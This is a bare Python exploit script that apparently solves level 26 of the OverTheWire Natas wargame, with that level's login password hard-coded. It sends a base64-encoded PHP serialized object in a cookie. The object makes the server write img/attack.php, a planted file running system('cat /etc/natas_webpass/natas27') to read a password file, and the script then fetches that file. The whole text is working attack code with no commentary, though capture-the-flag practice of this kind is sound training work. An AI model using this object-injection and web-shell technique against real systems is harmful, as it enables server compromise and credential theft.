import requests
import base64
import urllib

url="http://natas26.natas.labs.overthewire.org"
auth_user="natas26"
auth_pass="8A506rfIAXbKKk68yJeuTuRq4UfcK70k"

s= requests.Session()
r= s.get(url,auth=(auth_user,auth_pass))

s.cookies['drawing']="Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL2F0dGFjay5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30="
print(r.text)
print("*"*80)

r=s.get(url+'/img/attack.php',auth=(auth_user,auth_pass))
print(r.text)